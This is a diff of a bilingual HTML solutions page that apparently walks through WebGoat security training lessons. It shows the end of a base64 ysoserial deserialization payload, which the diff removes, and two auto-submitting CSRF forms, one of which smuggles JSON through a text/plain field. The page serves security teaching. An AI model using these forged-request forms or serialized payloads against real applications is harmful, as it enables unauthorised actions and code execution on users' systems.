mxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
-			</code>
-			<br>
-			The <a href="https://github.com/frohoff/ysoserial">ysoserial library</a> seems to be a search track too.
-		</span>
-	</div>
+        <div><br></div>
+        <h5>Vulnerable Components</h5>
+        <div><br></div>
+    </div>
 </div>
+
 <div><br></div>
 <div><br></div>
 <div>
-	<h4><u><b>Request Forgery:</b></u></h4>
+    <h4><u><b>(A8:2013) Request Forgery:</b></u></h4>
     <div>
-		<div><br></div>
-		<h5>Cross-Site Request Forgeries</h5>
-		<div><br></div>
-		<span class="multilang" lang="fr">
-		3. Cliquer sur <b>Envoyer</b>, copier l'adresse dans la barre d'URL, ouvrir un nouvel onglet, coller l'adresse.
-		</span>
-		<span class="multilang" lang="en">
-		3. Click on <b>Send</b>, copy the URL, open a new tab, paste the adress.
-		<div><br></div>
-		<span class="multilang" lang="fr">
-		4. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
-		</span>
-		<span class="multilang" lang="en">
-		4. Save the following code in a file <b>csrf.html</b> and open it in a web browser..
-		</span>
-		<br>
-		<code> 
-		<br>
-		&lt;form name="attack" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
-		<br>
-		&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='reviewText' value='This App Rocks'&gt;
-		<br>
-		&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='stars' value='5'&gt;
-		<br>
-		&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'&gt;
-		<br>
-		&lt;/form&gt;
-		<br>
-		&lt;script&gt;document.attack.submit();&lt;/script&gt;
-		<br>
-		</code>
-		<div><br></div>
-		<span class="multilang" lang="fr">
-		7. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
-		</span>
-		<span class="multilang" lang="en">
-		7. Save the following code in a file <b>csrf.html</b> and open it in a web browser..
-		</span>
-		<br>
-		<code> 
-		<br>
-		&lt;form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
-		<br>
-		&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'&gt;
-		<br>
-		&lt;/form&gt;
-		<br>
-		&lt;script&gt;document.attack.submit();&lt;/script&gt;
-		</code>
-		<div><br></div>
-		<span class="multilang" lang="fr">
-		8. Suivre les instructions.
-		</span>
-		<span class="multilang" lang="en">
-		8. Follow the instructions.
-		</span>
-	</div>
+        <div><br></div>
+        <h5>Cross-Site Request Forgeries</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            3. Cliquer sur <b>Envoyer</b>, copier l'adresse dans la barre d'URL, ouvrir un nouvel onglet, coller l'adresse.
+        </span>
+        <span class="multilang" lang="en">
+            3. Click on <b>Send</b>, copy the URL, open a new tab, paste the adress.
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            4. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
+        </span>
+        <span class="multilang" lang="en">
+            4. Save the following code in a file <b>csrf.html</b> and open it in a web browser..
+        </span>
+        <br>
+        <code>
+            <br>
+            &lt;form name="attack" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='reviewText' value='This App Rocks'&gt;
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='stars' value='5'&gt;
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'&gt;
+            <br>
+            &lt;/form&gt;
+            <br>
+            &lt;script&gt;document.attack.submit();&lt;/script&gt;
+            <br>
+        </code>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            7. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
+        </span>
+        <span class="multilang" lang="en">
+            7. Save the following code in a file <b>csrf.html</b> and open it in a web browser..
+        </span>
+        <br>
+        <code>
+            <br>
+            &lt;form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'&gt;
+            <br>
+            &lt;/form&gt;
+            <br>
+            &lt;script&gt;document.attack.submit();&lt;/script&gt;
+        </code>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            8. Suivre les instructions.
+        </span>
+        <span class="multilang" lang="en">
+            8. Follow the instructions.
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Server-Side Request Forgeries</h5>
+        <div><br></div>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>Client side:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>Bypass front-end restrictions</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>HTML tampering</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Client side filtering</h5>
+        <div><br></div>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>Challenges:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>WebGoat Challenge</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Admin lost password</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Without password</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Creating a new account</h5>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Without account</h5>
+        <div><br></div>
+    </div>
 </div>
